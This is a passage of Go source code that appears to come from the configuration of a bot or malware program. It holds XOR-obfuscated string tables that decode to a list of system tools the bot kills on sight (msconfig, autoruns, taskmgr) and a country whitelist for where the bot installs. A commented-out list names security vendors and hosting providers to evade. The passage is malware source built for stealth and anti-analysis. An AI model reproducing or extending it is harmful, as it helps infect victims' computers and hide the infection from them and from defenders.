maskedStr := []byte("\x4d\x74\xe1\x39\x34")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x1b\x87\x4f\x7c\x8f\x63\xbd\x4a\x79\xcc\x5b")
maskedStr := []byte("\x5d\xf2\x3c\x15\xe0\x0d\xf9\x2f\x1b\xb9\x3c")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x8b\x94\xd1\x09\xec\xea\x03\x58")
maskedStr := []byte("\xc5\xf1\xa5\x4b\x89\x8b\x6d\x2b")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xa1\xed\x5c\x72\x41\xbe\x2e\x84\x52\x1f\xe0\x20\x0f\x6e\x34")
maskedStr := []byte("\xf3\x8c\x28\x1b\x2e\xd0\x4f\xe8\x72\x4f\x95\x52\x66\x08\x4d")
res := make([]byte, 15)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x3c\xef\xc2\xd4\x1b\x4c\x52\x99\x33\x4f\x53\xb0\xd7\x54")
maskedStr := []byte("\x12\xa1\x87\x80\x3b\x1e\x37\xff\x5f\x2a\x30\xc4\xb8\x26")
res := make([]byte, 14)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x4b\x59\x2e\xeb\x04\x59\xae\xff\x4e\x47\xe1\x06")
maskedStr := []byte("\x08\x31\x4b\x8a\x70\x79\xeb\x91\x29\x2e\x8f\x63")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x8f\xb2\xf2\xb2\xb4\x73\x3b\xda\x65\xbf\x04\x74")
maskedStr := []byte("\xdc\xdb\x95\xdf\xd5\x53\x7e\xb4\x02\xd6\x6a\x11")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
	}
	processBlacklist  = [...]string{(func() string {
mask := []byte("\xab\xe0\x8c\x51\x04\x7a\x68\x7d")
maskedStr := []byte("\xc6\x93\xef\x3e\x6a\x1c\x01\x1a")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xfe\xf1\xf1\xc6\x87\xd9\x20\xee")
maskedStr := []byte("\x9f\x84\x85\xa9\xf5\xac\x4e\x9d")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x9c\xd7\x05\xb7\x7f\xb2\x9e")
maskedStr := []byte("\xe8\xb6\x76\xdc\x12\xd5\xec")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())} //Processes that Anti-Process will auto kill
	campaignWhitelist = [...]string{                                   //Countrys that the bot is allowed to install in
		(func() string {
mask := []byte("\xc7\xb7\x1e\x28\x85\xe0\x86\xa8\x3c\x06\xd1\x85\xde")
maskedStr := []byte("\x92\xd9\x77\x5c\xe0\x84\xa6\xfb\x48\x67\xa5\xe0\xad")
res := make([]byte, 13)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xef\x89\x68\xfe\xe2\x15")
maskedStr := []byte("\xac\xe8\x06\x9f\x86\x74")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xda\x0c\x15\xbf\xdd")
maskedStr := []byte("\x99\x64\x7c\xd1\xbc")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x08\xcd\x34\x11\x6e\xc7\xfd\xdd\x51\x28\x37")
maskedStr := []byte("\x46\xa8\x40\x79\x0b\xb5\x91\xbc\x3f\x4c\x44")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x63\x68\xbc\xc2\x6e\x0b\xe7\x1e\x5a")
maskedStr := []byte("\x30\x01\xd2\xa5\x0f\x7b\x88\x6c\x3f")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x9e\xe4\x64\xb1\xf7\x37\xa7\xf8\x1b\x6e\xd3\x99\x2a\xe4")
maskedStr := []byte("\xcb\x8a\x0d\xc5\x92\x53\x87\xb3\x72\x00\xb4\xfd\x45\x89")
res := make([]byte, 14)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x42\x43\xa7\x5e\xd0\x02\x1d")
maskedStr := []byte("\x04\x2a\xc9\x32\xb1\x6c\x79")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x64\x72\x99\x26\xf5\x76")
maskedStr := []byte("\x36\x07\xea\x55\x9c\x17")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xd1\xd5\x0d\x11\x30\x71\x58")
maskedStr := []byte("\x96\xb0\x7f\x7c\x51\x1f\x21")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x4f\xd3\xab\x73\xbb\xd0")
maskedStr := []byte("\x06\xa0\xd9\x12\xde\xbc")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x1c\xe9\xca\x37\x41\xa1\xf6\x76\x13\xd6\x7a")
maskedStr := []byte("\x4f\x86\xbf\x43\x29\x81\xbd\x19\x61\xb3\x1b")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xf2\xa0\x76\x66\xc3")
maskedStr := []byte("\xb8\xc1\x06\x07\xad")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x3b\x3a\x9c\xe8\x28\x50\x9a\x76\x2c\xfc\x48\x2a")
maskedStr := []byte("\x68\x55\xe9\x9c\x40\x70\xdb\x10\x5e\x95\x2b\x4b")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
	}
	//organizationBlacklist = [...]string{ //Organizations that do testing/Debugging/Anti-Virus work
	/*	"Amazon",
		"anonymous",
		"BitDefender",
		"BlackOakComputers",
		"Blue Coat",
		"BlueCoat",
		"Cisco",
		"cloud",
		"Data Center",
		"DataCenter",
		"DataCentre",
		"dedicated",
		"ESET, Spol",
		"FireEye",
		"ForcePoint",
		"Fortinet",
		"Hetzner",
		"hispeed.ch",
		"hosted",
		"Hosting",
		"Iron Port",
		"IronPort",
		"LeaseWeb",
		"MessageLabs",
		"Microsoft",
		"MimeCast",
		"NForce",
		"Ovh Sas",
		"Palo Alto",
		"ProofPoint",
		"Rackspace",
		"security",
		"Server",
		"Strong Technologies",
		"Trend Micro",
		"TrendMicro",
		"TrustWave",
		"VMVault",
		"Zscaler",*/
	//}

	//============================================================
	//                   Dont Touch Bellow
	//============================================================
)

const (
	MB_OK                = 0x00000000
	MB_OKCANCEL          = 0x00000001
	MB_ABORTRETRYIGNORE  = 0x00000002
	MB_YESNOCANCEL       = 0x00000003
	MB_YESNO             = 0x00000004
	MB_RETRYCANCEL       = 0x00000005
	MB_CANCELTRYCONTINUE = 0x00000006
	MB_ICONHAND          = 0x00000010
	MB_ICONQUESTION      = 0x00000020
	MB_ICONEXCLAMATION   = 0x00000030
	MB_ICONASTERISK      = 0x00000040
	MB_USERICON          = 0x00000080
	MB_ICONWARNING       = MB_ICONEXCLAMATION
	MB_ICONERROR         = MB_ICONHAND
	MB_ICONINFORMATION   = MB_ICONASTERISK
	MB_ICONSTOP          = MB_ICONHAND

	MB_DEFBUTTON1 = 0x00000000
	MB_DEFBUTTON2 = 0x00000100
	MB_DEFBUTTON3 = 0x00000200
	MB_DEFBUTTON4 = 0x00000300

	ERROR_ALREADY_EXISTS = 183

// Virtual-Key Codes
)

type Win32_Process struct {
	Name           string
	ExecutablePath *string
}
type Win32_Product struct {
	Name *string
}
